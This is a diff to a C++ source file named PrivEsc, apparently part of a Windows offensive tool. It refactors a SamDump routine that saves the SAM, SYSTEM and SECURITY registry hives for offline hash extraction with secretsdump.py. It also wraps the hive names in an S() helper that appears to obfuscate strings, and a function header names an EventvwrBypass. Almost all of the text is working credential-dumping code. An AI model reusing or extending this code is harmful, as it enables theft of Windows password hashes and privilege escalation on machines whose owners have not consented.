@@ -1,6 +1,5 @@
 #include "PrivEsc.h"
 #include <wlanapi.h>
-#pragma comment(lib, "wlanapi.lib")
 
 // ── Shared: write a registry string value ─────────────────────────────────────
 static bool RegSetStr(HKEY hRoot, const char* subkey, const char* name, const char* val) {
@@ -72,10 +71,11 @@ std::string PrivEsc::EventvwrBypass(const std::string& cmd) {
 std::string PrivEsc::SamDump(const std::string& outDir) {
     // SeBackupPrivilege required to save protected hives — available to SYSTEM/Admin.
     // After saving: use secretsdump.py -sam <SAM> -system <SYSTEM> -security <SEC> LOCAL
-    struct { HKEY root; const char* subkey; const char* filename; } hives[] = {
-        { HKEY_LOCAL_MACHINE, "SAM",      "SAM"      },
-        { HKEY_LOCAL_MACHINE, "SYSTEM",   "SYSTEM"   },
-        { HKEY_LOCAL_MACHINE, "SECURITY", "SECURITY" },
+    struct HiveEntry { std::string subkey; std::string filename; HKEY root; };
+    std::vector<HiveEntry> hives = {
+        { S("SAM"),      S("SAM"),      HKEY_LOCAL_MACHINE },
+        { S("SYSTEM"),   S("SYSTEM"),   HKEY_LOCAL_MACHINE },
+        { S("SECURITY"), S("SECURITY"), HKEY_LOCAL_MACHINE },
     };
 
     std::string result;
@@ -83,8 +83,8 @@ std::string PrivEsc::SamDump(const std::string& outDir) {
 
     for (auto& h : hives) {
         HKEY hKey = NULL;
-        if (RegOpenKeyExA(h.root, h.subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
-            result += std::string(h.filename) + ": RegOpenKeyEx failed err=" +
+        if (RegOpenKeyExA(h.root, h.subkey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
+            result += h.filename + ": RegOpenKeyEx failed err=" +
                       std::to_string(GetLastError()) + "\n";
             continue;
         }
@@ -97,18 +97,18 @@ std::string PrivEsc::SamDump(const std::string& outDir) {
         RegCloseKey(hKey);
 
         if (rc == ERROR_SUCCESS) {
-            result += std::string(h.filename) + ": saved -> " + outPath + "\n";
+            result += h.filename + ": saved -> " + outPath + "\n";
             ++saved;
         } else if (rc == ERROR_ALREADY_EXISTS) {
             // File exists — delete and retry once
             DeleteFileA(outPath.c_str());
             HKEY hKey2 = NULL;
-            RegOpenKeyExA(h.root, h.subkey, 0, KEY_READ, &hKey2);
+            RegOpenKeyExA(h.root, h.subkey.c_str(), 0, KEY_READ, &hKey2);
             rc = hKey2 ? RegSaveKeyExA(hKey2, outPath.c_str(), NULL, REG_LATEST_FORMAT)
                        : ERROR_INVALID_HANDLE;
             if (hKey2) RegCloseKey(hKey2);
             if (rc == ERROR_SUCCESS) {
-                result += std::string(h.filename) + ": saved -> " + outPath + "\n";
+                result += h.filename + ": saved -> " + outPath + "\n";
                 ++saved;
             } else {
                 result += std::string(h.filename) + ": RegSaveKeyEx failed err=" +
